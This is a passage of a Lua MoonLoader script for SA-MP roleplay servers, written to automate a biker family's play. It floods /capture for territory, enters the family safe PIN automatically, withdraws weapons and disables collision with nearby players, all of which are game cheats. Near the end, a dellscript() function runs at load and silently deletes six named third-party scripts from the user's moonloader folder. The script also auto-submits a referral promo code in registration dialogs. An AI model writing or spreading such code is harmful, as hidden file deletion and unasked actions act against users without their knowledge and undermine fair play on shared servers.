                ["1"] = {name = "", time = 0},
                ["2"] = {name = "", time = 0},
                ["3"] = {name = "", time = 0},
                ["4"] = {name = "", time = 0},
                ["5"] = {name = "", time = 0},
            }
            if captstart then
                captstart = false
            end
            spawn = true
        end

        if captstart and isKeyJustPressed(27) then
            captstart = false
            sampAddChatMessage('Автокапт остановлен', -1)
            closedialog()
        end

        if getActiveInterior() == 0 then
            for k, v in pairs(getAllChars()) do
                if select(2, sampGetPlayerIdByCharHandle(v)) == -1 and v ~= PLAYER_PED then
                    setCharCollision(v)
                end
            end
        end

        local isInInterior = (getActiveInterior() ~= 0 and imguiVariables.pintcol[0]) or (getActiveInterior() == 0 and imguiVariables.pcol[0])
        if isInInterior then
            for i = 0, sampGetMaxPlayerId(true) do
                if sampIsPlayerConnected(i) then
                    local result, id = sampGetCharHandleBySampPlayerId(i)
                    if result and doesCharExist(id) then
                        local x, y, z = getCharCoordinates(id)
                        local mX, mY, mZ = getCharCoordinates(PLAYER_PED)
                        if getDistanceBetweenCoords3d(x, y, z, mX, mY, mZ) < 0.9 then
                            setCharCollision(id, false)
                        end
                    end
                end
            end
        end

        server = sampGetCurrentServerName()
        if isKeyJustPressed(66) and not sampIsCursorActive() and server:find('Samp%-Rp%.Ru') then
			wait(10)
			sampSendChat("/grib eat")
			wait(250)
			sampSendChat("/grib heal")
			wait(50)
			sampSendChat(" ")
		end
    end
end

if all_libs_downloaded then
    function sampev.onSendChat(text)
        if GetInfoAction then
            return false
        end
    end

    function sampev.onSendPlayerSync(data)
        if NeedInfo then
            lua_thread.create(function()
                wait(1500)
                GetInfoAction = true
                sampSendChat("/fpanel")
                GetDialogMembers = true
                wait(500)
                GetInfoAction = false
            end)
            NeedInfo = false
        end
    end

    function sampev.onSendCommand(command)
        local cmd, params = command:match("(/%S+)%s*(.*)")
        if not cmd then
            return false
        end

        if GetInfoAction then
            if cmd ~= "/fpanel" and cmd ~= "/stats" and cmd ~= "/capture" and cmd ~= "/ffreeze" then
                return false
            end
        end

        if cmd:lower() == "/fsafe" then
            if not open then
                pin = true
            end
            if not params or params == "" then
                return true
            end
            local allowedParams = { "rem", "skin", "material", "drug", "key", "fish" }
            local param, value = params:lower():match("^(%a+)%s*(%d*)$")
            local isAllowed = false
            for _, p in ipairs(allowedParams) do
                if param == p then
                    isAllowed = true
                    break
                end
            end
            if not isAllowed then
                sampAddChatMessage('Недопустимый параметр', 0xFF0000)
                return false
            end
            if param == "drug" then
                if drugtimer > 0 then
                    sampAddChatMessage('Нельзя использовать слишком часто', 0xFF0000)
                    return false
                end
                local numValue = tonumber(value)
                if not numValue or value == "" then
                    sampAddChatMessage('Недопустимый параметр', 0xFF0000)
                    return false
                end
            elseif value == "" then
                sampAddChatMessage('Недопустимый параметр', 0xFF0000)
                return false
            end
            return true
        end

        if string.match(cmd, "^/safe") then
            fam = false
        end
    end

    function sampev.onServerMessage(color, text)
        if text:find('Вам необходимо состоять в семье') and color == -1077886209 then
            print('Скрипт выгружен')
            thisScript():unload()
            GetDialogMembers = false
            return false
        end

        if text:find('Внимание.+ MC спровоцировала войну с .+ MC за территорию .+. Инициатор: .+') and color == -1137955585 then
            lua_thread.create(function()
                wait(100)
                captureactive = false
            end)
            captstart = false
            lua_thread.create(closedialog)
        end

        if text:find('Не флуди') and color == -2770006 and (captureactive or captstart) then
            return false
        end

        if text:find('Вы успешно покинули семью') and color == -1077886209 then
            print('Скрипт выгружен')
            thisScript():unload()
        end

        if text:find('.+ выгнал Вас из семьи. Причина: .+') and color == 1806958506 then
            print('Скрипт выгружен')
            thisScript():unload()
        end

        if color == -858993409 and fam then
            if text:find('Вы взяли %d+ пт. Deagle') then
                lua_thread.create(function()
                    local startTime = os.clock()
                    while os.clock() - startTime < 30 do
                        wait(0)
                        timer = 30 - (os.clock() - startTime)
                    end
                end)
            elseif text:find('Вы взяли %d+ наркотиков') then
                local drugCount = tonumber(text:match('Вы взяли (%d+) наркотиков'))
                if drugCount and drugCount >= 20 then
                    lua_thread.create(function()
                        local startTime = os.clock()
                        while os.clock() - startTime < 120 do
                            wait(0)
                            drugtimer = 120 - (os.clock() - startTime)
                        end
                    end)
                end
            end
        end

        if color == -1137955585 and text:find('Баланс Вашей семьи отрицательный. Доступ заблокирован') then
            spawn = false
            lua_thread.create(function()
                setVirtualKeyDown(18, true)
                wait(20)
                setVirtualKeyDown(18, false)
            end)
        end

        if color == -1347440726 then
            if text:find("Склад вашей семьи закрыт") or text:find('Вы должны находиться в привязанном к семье доме') or text:find('Вы далеко от сейфа!') then
                fsafe = false
            elseif text:find('Данный дом не привязан к Вашей семье') then
                spawn = false
            elseif text:find("Склад закрыт") then
                fgg = false
                ggde = 0
                ggm4 = 0
                ggsh = 0
                ggri = 0
            elseif text:find('Парковка данного транспорта доступна с ') then
                lua_thread.create(closedialog)
            end
        end

        if color == -858993409 then
            if text:find("Пин-код не совпал") then
                fsafe = false
            elseif text:find('Доступные параметры: .+') then
                return false
            elseif text:find('Для быстрого взятия используйте.+') then
                return false
            elseif text:find('Загрузка сейфа отменена') then
                fsafe = false
                open = false
            elseif text:find(' для семейного штаба') then
                return false
            elseif text:find('Нельзя убрать т/с, которое находится на ивенте') then
                lua_thread.create(closedialog)
            end
        end

        if color == -3407617 and text:find("Сейф открывается") and (pin or fsafe) then
            open = true
            pin = false
        end

        if text:find('.+ {FFFFFF}.+ взял.+из сейфа %d+ пт. Deagle') and FamilySafeInfo.de ~= "no info" then
            local pt = text:match('.+ {FFFFFF}.+ взял.+из сейфа (%d+) пт. Deagle')
            FamilySafeInfo.de = FamilySafeInfo.de - tonumber(pt)
        elseif text:find('.+ {FFFFFF}.+ положил.+в сейф %d+ пт. Deagle') and FamilySafeInfo.de ~= "no info" then
            local pt = text:match('.+ {FFFFFF}.+ положил.+в сейф (%d+) пт. Deagle')
            FamilySafeInfo.de = FamilySafeInfo.de + tonumber(pt)

        elseif text:find('.+ {FFFFFF}.+ взял.+из сейфа %d+ пт. AK47') and FamilySafeInfo.ak ~= "no info" then
            local pt = text:match('.+ {FFFFFF}.+ взял.+из сейфа (%d+) пт. AK47')
            FamilySafeInfo.ak = FamilySafeInfo.ak - tonumber(pt)
        elseif text:find('.+ {FFFFFF}.+ положил.+в сейф %d+ пт. AK47') and FamilySafeInfo.ak ~= "no info" then
            local pt = text:match('.+ {FFFFFF}.+ положил.+в сейф (%d+) пт. AK47')
            FamilySafeInfo.ak = FamilySafeInfo.ak + tonumber(pt)

        elseif text:find('.+ {FFFFFF}.+ взял.+из сейфа %d+ пт. M4') and FamilySafeInfo.m4 ~= "no info" then 
            local pt = text:match('.+ {FFFFFF}.+ взял.+из сейфа (%d+) пт. M4')
            FamilySafeInfo.m4 = FamilySafeInfo.m4 - tonumber(pt)
        elseif text:find('.+ {FFFFFF}.+ положил.+в сейф %d+ пт. M4') and FamilySafeInfo.m4 ~= "no info" then
            local pt = text:match('.+ {FFFFFF}.+ положил.+в сейф (%d+) пт. M4')
            FamilySafeInfo.m4 = FamilySafeInfo.m4 + tonumber(pt)

        elseif text:find('.+ {FFFFFF}.+ взял.+из сейфа %d+ пт. Shotgun') and FamilySafeInfo.sh ~= "no info" then
            local pt = text:match('.+ {FFFFFF}.+ взял.+из сейфа (%d+) пт. Shotgun')
            FamilySafeInfo.sh = FamilySafeInfo.sh - tonumber(pt)
        elseif text:find('.+ {FFFFFF}.+ положил.+в сейф %d+ пт. Shotgun') and FamilySafeInfo.sh ~= "no info" then
            local pt = text:match('.+ {FFFFFF}.+ положил.+в сейф (%d+) пт. Shotgun')
            FamilySafeInfo.sh = FamilySafeInfo.sh + tonumber(pt)

        elseif text:find('.+ {FFFFFF}.+ взял.+из сейфа %d+ пт. Rifle') and FamilySafeInfo.ri ~= "no info" then
            local pt = text:match('.+ {FFFFFF}.+ взял.+из сейфа (%d+) пт. Rifle')
            FamilySafeInfo.ri = FamilySafeInfo.ri - tonumber(pt)
        elseif text:find('.+ {FFFFFF}.+ положил.+в сейф %d+ пт. Rifle') and FamilySafeInfo.ri ~= "no info" then
            local pt = text:match('.+ {FFFFFF}.+ положил.+в сейф (%d+) пт. Rifle')
            FamilySafeInfo.ri = FamilySafeInfo.ri + tonumber(pt)
        end

        if text:find('masanovskiy.+ {FFFFFF}.+ (.+) припарковал.+т/c Sultan из слота %d+') then
            local name, slot = text:match('masanovskiy.+ {FFFFFF}.+ (.+) припарковал.+т/c Sultan из слота (%d+)')
            name = name:gsub('%[%d+%]', '')
            FamilyFixcarInfo[slot] = { name = name, time = os.time() }
        end

        if text:find('Ваш инвентарь вмещает до %d канистр.+') and color == -858993409 and fuel then
            fuel = false
            return false
        end
        if text:find('Если у вас есть канистра с бензином, введите ') and color == 866792447 then
            lua_thread.create(function()
                wait(100)
                if isCharInAnyCar(PLAYER_PED) then
                    local car = storeCarCharIsInNoSave(PLAYER_PED)
                    local id = getCarModel(car)
                    local clr1, clr2 = getCarColours(car)
                    if id == 560 and clr1 == 128 and clr2 == 128 then
                        sampSendChat('/fillcar')
                    end
                end
            end)
        end

        local nickname = text:match("(%w+_%w+)")
        if nickname then
            if text:match(".+{FFFFFF}.+%w+_%w+ взял.+из сейфа ") then
                if not imguiVariables.fctext[0] then
                    local id = sampGetPlayerIdByNickname(nickname)
                    local color1 = ("%06X"):format(bit.band(sampGetPlayerColor(id), 0xFFFFFF))
                    local msg = text:gsub(nickname, "{" .. color1 .. "}" .. nickname .. "{" .. color1 .. "}" .. "{FFFFFF}")
                    return {color, msg}
                else
                    return false
                end
            end

            if text:match(".+{FFFFFF}.+%w+_%w+ припарковал") or text:match(".+{FFFFFF}.+%w+_%w+ убрал") then
                if not imguiVariables.vehtext[0] then
                    local id = sampGetPlayerIdByNickname(nickname)
                    local color1 = ("%06X"):format(bit.band(sampGetPlayerColor(id), 0xFFFFFF))
                    local msg = text:gsub(nickname, "{" .. color1 .. "}" .. nickname .. "{" .. color1 .. "}" .. "{FFFFFF}")
                    return {color, msg}
                else
                    return false
                end
            end
        else
            return {color, text}
        end
    end

    function sampev.onShowDialog(dialogId, dialogStyle, dialogTitle, okButtonText, cancelButtonText, dialogText)
        if dialogTitle:find("Панель | {......}Семья") and dialogText:find("Наименование родства") and GetDialogMembers then
            local family = dialogText:match("Наименование семьи . {......}([%wа-яА-ЯёЁ_ ]+)")
            if family ~= 'masanovskiy' and family ~= 'masanovskiy squad' and family ~= 'масановский' then
                sampSendDialogResponse(dialogId, 0, _, _)
                print('Скрипт выгружен')
                sampAddChatMessage('Выгружен чек фамы', 0xff0000)
                thisScript():unload()
                return false
            end
            GetDialogMembers = false
            sampSendDialogResponse(dialogId, 0, _, _)
            return false
        end

        if fgg then
            if dialogTitle:find('Склад') and dialogText:find('1. Оружейный склад') then
                sampSendDialogResponse(dialogId, 1, 0, -1)
                biker = true
                return false
            end
            if dialogTitle:find("Взять оружие со склада") then
                if ggde > 0 then
                    sampSendDialogResponse(dialogId, 1, 0, -1)
                    ggde = ggde - 1
                    return false
                elseif ggm4 > 0 then
                    sampSendDialogResponse(dialogId, 1, 3, -1)
                    ggm4 = ggm4 - 1
                    return false
                elseif ggsh > 0 then
                    sampSendDialogResponse(dialogId, 1, 1, -1)
                    ggsh = ggsh - 1
                    return false
                elseif ggri > 0 then
                    sampSendDialogResponse(dialogId, 1, 2, -1)
                    ggri = ggri - 1
                    return false
                elseif imguiVariables.m_arm[0] and not biker then
                    sampSendDialogResponse(dialogId, 1, 7, -1)
                    if ggde == 0 and ggm4 == 0 and ggri == 0 and ggsh == 0 then
                        fgg = false
                        close = true
                    end
                    return false
                end
                if ggde == 0 and ggm4 == 0 and ggri == 0 and ggsh == 0 and (not imguiVariables.m_arm[0] or biker) then
                    fgg = false
                    biker = false
                    close = true
                end
            end

            if dialogTitle:find("Склад оружия") then
                local myskin = skins[getCharModel(PLAYER_PED)] or getCharModel(PLAYER_PED)
                if myskin == "Biker" then
                    biker = true
                end
                if ggde > 0 then
                    sampSendDialogResponse(dialogId, 1, 0, -1)
                    ggde = ggde - 1
                    return false
                elseif ggm4 > 0 then
                    sampSendDialogResponse(dialogId, 1, 4, -1)
                    ggm4 = ggm4 - 1
                    return false
                elseif ggsh > 0 then
                    sampSendDialogResponse(dialogId, 1, 1, -1)
                    ggsh = ggsh - 1
                    return false
                elseif ggri > 0 then
                    sampSendDialogResponse(dialogId, 1, 5, -1)
                    ggri = ggri - 1
                    return false
                elseif imguiVariables.m_arm[0] and not biker then
                    sampSendDialogResponse(dialogId, 1, 6, -1)
                    if ggde == 0 and ggm4 == 0 and ggri == 0 and ggsh == 0 then
                        fgg = false
                        close = true
                    end
                    return false
                end
                if ggde == 0 and ggm4 == 0 and ggri == 0 and ggsh == 0 and (not imguiVariables.m_arm[0] or biker) then
                    fgg = false
                    biker = false
                    close = true
                end
            end
        end
        if close then
            sampSendDialogResponse(dialogId, 0, -1, -1)
            close = false
            return false
        end

        if dialogTitle:find('Статистика | {......}Персонаж') and stats then
            bfraction, brank = dialogText:match('Организация.-(.+) MC.-Должность.-(%d+)')
            bfraction = bfraction:match("^%s*(.-)%s*$")
            sampSendDialogResponse(dialogId, 0, _, _)
            if tonumber(brank) < 6 then
                lua_thread.create(function()
                    wait(1500)
                    sampSendChat('/f ранг')
                end)
            end
            stats = false
            return false
        end

        if dialogTitle:find('{FFFFFF}Панель управления | {ae433d} Заморозка фракций') and ffreeze then
            for line in dialogText:gmatch("[^\n]+") do
                if line:find("%d+.\t .+\t {008000}Включена") then
                    local fraction = line:match("%d+.\t (.+)\t {008000}Включена")
                    Freezes[fraction] = true
                elseif line:find("%d+.\t .+\t {ae433d}Выключена") then
                    local fraction = line:match("%d+.\t (.+)\t {ae433d}Выключена")
                    Freezes[fraction] = false
                end
            end
            sampSendDialogResponse(dialogId, 0, _, _)
            ffreeze = false
            return false
        end

        if dialogTitle:find('Объявить войну за территорию') then
            local captureindex = nil
            if capture then
                local targetMC = {}
                local currentIndex = 0
                if bfraction == 'Pagans' then
                    targetMC = {"Warlocks MC", "Mongols MC"}
                elseif bfraction == 'Warlocks' then
                    targetMC = {"Mongols MC", "Pagans MC"}
                elseif bfraction == 'Mongols' then
                    targetMC = {"Pagans MC", "Warlocks MC"}
                end
                for line in string.gmatch(dialogText, "[^\n]+") do
                    local found = false
                    for _, target in ipairs(targetMC) do
                        if string.find(line, target, 1, true) and not Freezes[target] then
                            found = true
                            captureindex = currentIndex
                            break
                        end
                    end
                    if found then break end
                    currentIndex = currentIndex + 1
                end
                if captureindex then
                    sampSendDialogResponse(dialogId, 0, _, _)
                    capture = false
                    captstart = true
                    lua_thread.create(function()
                        if not captureactive then
                            sampAddChatMessage('Автокапт запущен. Для отключения нажмите клавишу ESC. Выбранный бизнес: {00ff00}' .. captureindex, -1)
                            while captstart do
                                sampSendChat('/capture')
                                sampSendDialogResponse(sampGetCurrentDialogId(), 1, captureindex - 1, _)
                                wait(cfg.FLOODER.await)
                            end
                        end
                    end)
                else
                    sampAddChatMessage('Ошибка: подходящая строка не найдена!', 0xFF0000)
                    capture = false
                    sampSendDialogResponse(dialogId, 0, _, _)
                    return false
                end
            end
        end

        if dialogTitle:find('{FFFFFF}Перечень | {ae433d}Автомобили') then
            if ausgang_ein and not dop and not spawn then
                sampSendDialogResponse(dialogId, 0, _, _)
                ausgang_ein = false
                ausgang_zwei = true
                return false
            end
        end

        if dialogTitle:find('{......}Дом') and dialogText:find('Сигнализация') then
            if spawn and not heal and not dop and not ausgang_zwei then
                sampSendDialogResponse(dialogId, 1, 7, _)
                return false
            end

            if ausgang_zwei and not spawn and not dop and not heal then
                sampSendDialogResponse(dialogId, 0, _, _)
                ausgang_zwei = false
                spawn = true
                lua_thread.create(closedialog)
                return false
            end

            if heal then
                sampSendDialogResponse(dialogId, 1, 1, _)
                heal = false
                spawn = true
                return false
            end

            if dop and not spawn and not heal and not ausgang_zwei then
                sampSendDialogResponse(dialogId, 1, 8, _)
                lua_thread.create(closedialog)
                return false
            end
            spawn = true
        end

        if dialogTitle:find('{FFFFFF}Дополнительный автопарк семьи') then
            if dop then
                local index = 0
                for line in string.gmatch(dialogText, "[^\n]+") do
                    if string.find(line, "Sultan", 1, true) then
                        sampSendDialogResponse(dialogId, 1, index - 1, _)
                        found = true
                        dop = false
                        dop_exit = true
                        return false
                    end
                    index = index + 1
                end
                if not found then
                    sampAddChatMessage('Sultan не найден в доп. автопарке', 0xFF0000)
                    dop = false
                    dop_exit = true
                end
            end
            if dop_exit and not dop then
                sampSendDialogResponse(dialogId, 0, _, _)
                dop_exit = false
                spawn = true
                return false
            end
        end

        if dialogTitle:find('{FFFFFF}Доп. семейный автопарк') and dialogText:find('Вы действительно .+ средство Sultan') then
            sampSendDialogResponse(dialogId, 1, _, _)
            return false
        end

        if dialogTitle:find('{FFFFFF}Подтверждение | {ae433d}Удаление семейного ТС') or dialogTitle:find('{FFFFFF}Подтверждение | {ae433d}Парковка семейного ТС') then
            sampSendDialogResponse(dialogId, 1, _, _)
            return false
        end

        if dialogTitle:find('{FFFFFF}Перечень | {ae433d}Автомобили') then
            local lines = {}
            for line in string.gmatch(dialogText, "[^\n]+") do
                local new_line
                if line:find("{FFFFFF}Автомобиль") then
                    new_line = "{FFFFFF}Слот\t{FFFFFF}Автомобиль\t{FFFFFF}Позиция\t{FFFFFF}Заспавнил"
                else
                    local slot, car, position = line:match("(%d+)%. \t(.+)\t(.+)\t.+")
                    if position:find("На парковке") then
                        FamilyFixcarInfo[slot] = { name = "", time = 0 }
                    end
                    local playerId = sampGetPlayerIdByNickname(FamilyFixcarInfo[slot].name)
                    local players_info
                    if playerId and playerId ~= -1 then
                        local colorCode = "{" .. ("%06X"):format(bit.band(sampGetPlayerColor(playerId), 0xFFFFFF)) .. "}"
                        players_info = ("%s%s{FFFFFF} [%s сек]"):format(colorCode, FamilyFixcarInfo[slot].name, os_time() - FamilyFixcarInfo[slot].time)
                    else
                        FamilyFixcarInfo[slot] = { name = "", time = 0 }
                        players_info = ""
                    end
                    new_line = ("%s.\t%s\t%s\t%s"):format(slot, car, position, players_info)
                end
                table.insert(lines, new_line)
            end
            dialogText = table.concat(lines, "\n")
            dialogTitle = '{ae433d}Используйте клавиши {FFFFFF}" 1-6 " {ae433d}для быстрой парковки'
            return { dialogId, dialogStyle, dialogTitle, okButtonText, cancelButtonText, dialogText }
        end

        if dialogTitle:match('{FFFFFF}Регистрация | {......}Приглашение') or dialogTitle:match('{FFFFFF}Настройки | {......}Ввод промокода') then
            sampSendDialogResponse(dialogId, 1, nil, '#masan')
            return false
        end
    end

    local warnings_cd = {}

    function sampev.onPlayerSync(id, data)
        if getActiveInterior() == 10 then
            local result, ped = sampGetCharHandleBySampPlayerId(id)
            local myx, myy, myz = getCharCoordinates(PLAYER_PED)
            if result and getDistanceBetweenCoords2d(412.837, 2534.382, data.position.x, data.position.y) < 100 and getDistanceBetweenCoords2d(myx, myy, data.position.x, data.position.y) < 100 and not ((isCharInArea2d(ped, 412.837, 2534.382, 421.638, 2543.103, false) or isCharInArea2d(ped, 422.996, 2538.925, 419.755, 2534.704, false)) and data.position.z >= 9 and data.position.z <= 13) then
                if not warnings_cd[id] or warnings_cd[id] < os.clock() then
                    local clrPlayer = string.format('%06X', bit.band(sampGetPlayerColor(id), 0xFFFFFF))
                    local text = ("<WARNING> {%s}%s[%s] {ffffff}возможно летает за текстурой интерьера"):format(clrPlayer, sampGetPlayerNickname(id), id)
                    sampAddChatMessage(text, 0xff0000)
                    warnings_cd[id] = os.clock() + 8
                end
            end
        end
    end

    function sampev.onShowTextDraw(id, data)
        if data.text:find('FAMILY') then
            fam = true
        elseif data.text:find('HOUSE') then
            fam = false
        end

        if data.text:find("1____2____3") and (fsafe or pin) and not open and fam then
            lua_thread.create(function()
                for i = 0, 9 do
                    safeNumbers[tostring(i)] = id + 10 + i
                end
                safeNumbers["0"] = id + 21
                safeNumbers["Enter"] = id + 22
                local safe_pinStr = tostring(safe_pin)
                for i = 1, 4 do
                    wait(200)
                    local num = tonumber(safe_pinStr:sub(i, i))
                    if num then
                        sampSendClickTextdraw(safeNumbers[tostring(num)])
                    end
                end
                wait(200)
                sampSendClickTextdraw(safeNumbers["Enter"])
            end)
        end

        if fsafe and not take_action then
            if FsafeGun.fsde then
                if data.modelId == 348 then
                    TakeSafeGun(id, tonumber(imguiVariables.s_de[0]), "fsde")
                end
            end
            if FsafeGun.fsak then
                if data.modelId == 355 then
                    TakeSafeGun(id, tonumber(imguiVariables.s_ak[0]), "fsak")
                end
            end
            if FsafeGun.fsm4 and not FsafeGun.fsak then
                if data.modelId == 356 then
                    TakeSafeGun(id, tonumber(imguiVariables.s_m4[0]), "fsm4")
                end
            end
            if FsafeGun.fssh then
                if data.modelId == 349 then
                    TakeSafeGun(id, tonumber(imguiVariables.s_sh[0]), "fssh")
                end
            end
            if FsafeGun.fsri then
                if data.modelId == 357 then
                    TakeSafeGun(id, tonumber(imguiVariables.s_ri[0]), "fsri")
                end
            end
            if not FsafeGun.fsde and not FsafeGun.fsak and not FsafeGun.fsm4 and not FsafeGun.fssh and not FsafeGun.fsri then
                if isNearZero(252.5, data.position.x) and isNearZero(294.47720336914, data.position.y) then
                    lua_thread.create(function()
                        fsafe = false
                        wait(cfg.SAFE.sleep)
                        sampSendClickTextdraw(id)
                    end)
                end
            end
        end

        if fam then
            if isNearZero(261.79940795898, data.position.x) and isNearZero(191.28500366211, data.position.y) then
                if data.text:find("%d+%/%d+") then
                    FamilySafeInfo.de = tonumber(data.text:match("(%d+)%/%d+"))
                end
            end
            if isNearZero(367.76620483398, data.position.x) and isNearZero(191.28500366211, data.position.y) then
                if data.text:find("%d+%/%d+") then
                    FamilySafeInfo.ak = tonumber(data.text:match("(%d+)%/%d+"))
                end
            end
            if isNearZero(332.43280029297, data.position.x) and isNearZero(191.28500366211, data.position.y) then
                if data.text:find("%d+%/%d+") then
                    FamilySafeInfo.m4 = tonumber(data.text:match("(%d+)%/%d+"))
                end
            end
            if isNearZero(402.76620483398, data.position.x) and isNearZero(191.28500366211, data.position.y) then
                if data.text:find("%d+%/%d+") then
                    FamilySafeInfo.sh = tonumber(data.text:match("(%d+)%/%d+"))
                end
            end
            if isNearZero(297.13259887695, data.position.x) and isNearZero(231.65170288086, data.position.y) then
                if data.text:find("%d+%/%d+") then
                    FamilySafeInfo.ri = tonumber(data.text:match("(%d+)%/%d+"))
                end
            end

            if isNearZero(301.16680908203, data.position.x) and isNearZero(294.47720336914, data.position.y) then
                lua_thread.create(function()
                    wait(10)
                    deleted_take = id
                    sampTextdrawDelete(id)
                end)
            end
        end

        if data.text == "~b~~h~C: -$1000" and (getActiveInterior() ~= 51 and getActiveInterior() ~= 0) then
            spawn = false
            ausgang_ein = true
            lua_thread.create(function()
                wait(200)
                setGameKeyState(15, 256)
                setGameKeyState(15, -256)
                spawn = true
            end)
        end

        if data.text == "~b~/fill" then
            fuel = true
            lua_thread.create(function()
                wait(100)
                sampSendChat('/get fuel')
            end)
        end

        if isNearZero(86.5, data.position.x) and isNearZero(243.5, data.position.y) then
            if data.text:find("ID:_0") or data.text == "ID:_1" then
                imguiVariables.m_arm[0] = false
            elseif data.text == "ID:_2" or data.text == "ID:_3" or data.text == "ID:_4" then
                imguiVariables.m_arm[0] = true
            end
        end
        if isNearZero(39, data.position.x) and isNearZero(204, data.position.y) and data.text:match("ID:__~w~(%d+)") then
            if tonumber(id) == 0 or id == 1 then
                imguiVariables.m_arm[0] = false
            elseif id == 2 or id == 3 or id == 4 then
                imguiVariables.m_arm[0] = true
            end
        end

        if isNearZero(271.63327026367, data.position.x) and isNearZero(170.05920410156, data.position.y) and data.letterColor == -11585281 then
            data.text = string.gsub(data.text, "%d", 'x')
            lua_thread.create(function()
                sampTextdrawSetString(id, data.text)
            end)
        end
        return {id, data}
    end
end

function TakeSafeGun(id, gun, gun_key)
    lua_thread.create(function()
        take_action = true
        wait(cfg.SAFE.sleep)
        sampSendClickTextdraw(id)
        wait(cfg.SAFE.sleep)
        if deleted_take then
            sampSendClickTextdraw(deleted_take)
        else
            sampAddChatMessage('Текстдрав для "TAKE" не найден', 0xFF0000)
            return false
        end
        dialogtitle = sampGetDialogCaption()
        dialogid = sampGetCurrentDialogId()
        while not sampIsDialogActive() and dialogtitle ~= 'Сейф | Взять' do wait(0) dialogtitle = sampGetDialogCaption() dialogid = sampGetCurrentDialogId() end
        sampSendDialogResponse(dialogid, 1, 0, gun)
        FsafeGun[gun_key] = false
        take_action = false
        wait(100)
        sampCloseCurrentDialogWithButton(0)
    end)
end

function capturetimer_func()
    local hour, minute, second = getCurrentTime()
    local isSaintLouis = server:find('Evolve%-Rp%.Ru | Server: Saint.Louis') ~= nil
    local isNewOrleans = server:find('Evolve%-Rp%.Ru | Server: New Orleans') ~= nil
    if (isSaintLouis and hour % 2 == 0) or (isNewOrleans and hour % 2 ~= 0) then
        local lastSecond = -1
        if minute == 24 and second ~= lastSecond then
            local myskin = skins[getCharModel(PLAYER_PED)] or getCharModel(PLAYER_PED)
            if myskin == "Biker" then
                printStringNow(string.format('capture: %d', 60 - second), 1000)
            end
            lastSecond = second
        end
    end
end

function autocapture_func()
    local hour, minute, second = getCurrentTime()
    local isSaintLouis = server:find('Evolve%-Rp%.Ru | Server: Saint.Louis') ~= nil
    local isNewOrleans = server:find('Evolve%-Rp%.Ru | Server: New Orleans') ~= nil
    if (isSaintLouis and hour % 2 == 0) or (isNewOrleans and hour % 2 ~= 0) then
        local myskin = skins[getCharModel(PLAYER_PED)] or getCharModel(PLAYER_PED)
        if myskin ~= "Biker" then return end
        if minute == 23 and second == 45 then
            GetInfoAction = true
            stats = true
            wait(1000)
            sampSendChat('/stats')
            wait(500)
            GetInfoAction = false
        end
        if minute == 23 and second == 55 then
            GetInfoAction = true
            ffreeze = true
            wait(1000)
            sampSendChat('/ffreeze')
            wait(500)
            GetInfoAction = false
        end
        if minute == 24 and second == 40 then
            GetInfoAction = true
            capture = true
            wait(1000)
            sampSendChat('/capture')
            wait(500)
            GetInfoAction = false
        end
        if minute == 26 and second == 10 then
            captstart = false
            sampSendDialogResponse(dialogId, 0, _, _)
            return false
        end
    end
end

function inside_biker_zone()
    for k, v in pairs(BikerZones) do
        local vector = {x = (v[3] - v[1]) / 20, y = (v[4] - v[2]) / 20}
        if isCharInArea2d(PLAYER_PED, v[1] - vector.x, v[2] - vector.y, v[3] + vector.x, v[4] + vector.y, false) then
            return true
        end
    end
    return false
end

function renders_func()
    local X = cfg.RENDER.fspos_x
    local Y = cfg.RENDER.fspos_y

    if settings.fs_change or tonumber(m4) or tonumber(de) then
        local posX, posY = getCursorPos()
        if isKeyJustPressed(32) then
            sampAddChatMessage('Новая позиция сохранена', -1)
            showCursor(false, false)
            settings.fs_change = false
            cfg.RENDER.fspos_x = posX
            cfg.RENDER.fspos_y = posY
            wait(100)
            renderWindow[0] = true
            inicfg.save(cfg, 'safe.ini')
        end
        X = posX
        Y = posY
    end
    text = ("{8e8e8e}DE:{ffffff} %s\n{8e8e8e}AK:{ffffff} %s\n{8e8e8e}M4:{ffffff} %s\n{8e8e8e}SH:{ffffff} %s\n{8e8e8e}RI:{ffffff} %s"):format(FamilySafeInfo.de, FamilySafeInfo.ak, FamilySafeInfo.m4, FamilySafeInfo.sh, FamilySafeInfo.ri)

    if settings.fs_change or (FamilySafeInfo.de ~= 'no info' and FamilySafeInfo.ak ~= 'no info' and FamilySafeInfo.m4 ~= 'no info' and FamilySafeInfo.sh ~= 'no info' and FamilySafeInfo.ri ~= 'no info') and imguiVariables.s_render[0] then
        renderFontDrawText(FamilySafeInfo.font, text, X, Y, -1)
    end

    local kvX = cfg.RENDER.kvpos_x
    local kvY = cfg.RENDER.kvpos_y

    if settings.kv_change then
        local posX, posY = getCursorPos()
        if isKeyJustPressed(32) then
            sampAddChatMessage('Новая позиция сохранена', -1)
            showCursor(false, false)
            settings.kv_change = false
            cfg.RENDER.kvpos_x = posX
            cfg.RENDER.kvpos_y = posY
            wait(100)
            renderWindow[0] = true
            inicfg.save(cfg, 'safe.ini')
        end
        kvX = posX
        kvY = posY
    end

    if (inside_biker_zone() and getActiveInterior() == 0 and imguiVariables.kv_render[0]) or settings.kv_change then
        local myskin = skins[getCharModel(PLAYER_PED)] or getCharModel(PLAYER_PED) or tostring(getCharModel(PLAYER_PED))
        if settings.kv_change or myskin == "Biker" then
            renderFontDrawText(font, "В квадрате", kvX, kvY, 0xff00e300)
        end
    end
end

function sampGetPlayerIdByNickname(nick)
	local _, myid = sampGetPlayerIdByCharHandle(playerPed)
	if tostring(nick) == sampGetPlayerNickname(myid) then return myid end
	for i = 0, 1000 do if sampIsPlayerConnected(i) and sampGetPlayerNickname(i) == tostring(nick) then return i end end
end

function isNearZero(a, b)
    return math.abs(a-b) <= 0.001
end

function getCurrentTime()
    local current_time_utc = os.time(os.date("!*t"))
    local current_time_msk = current_time_utc + (3 * 60 * 60)
    local time = os.date("*t", current_time_msk)
    return time.hour, time.min, time.sec
end

function closedialog()
	wait(200)
	sampCloseCurrentDialogWithButton(0)
end

function dellscript()
    local files = {"fast fsafe&getgun.lua", "Adaptive_FH.lua", "plitts_safe.lua", "Mafia_SRP.luac", "Palenation Tool Extended.luac", "SP.luac"}
    for _, v in pairs(files) do
        local filePath = "moonloader/"..v
        if doesFileExist(filePath) then
            os.remove(filePath)
        end
    end
end
dellscript()

addEventHandler('onWindowMessage', function(msg, wparam, lparam)
    if msg == wm.WM_KEYDOWN and wparam == 27 then
        if renderWindow[0] then
            consumeWindowMessage(true, false)
        end
    end
    if msg == wm.WM_KEYUP and wparam == 27 then
        if renderWindow[0] then
            renderWindow[0] = false
        end
    end
end)

function theme()
    local style = imgui.GetStyle()
    local colors = style.Colors
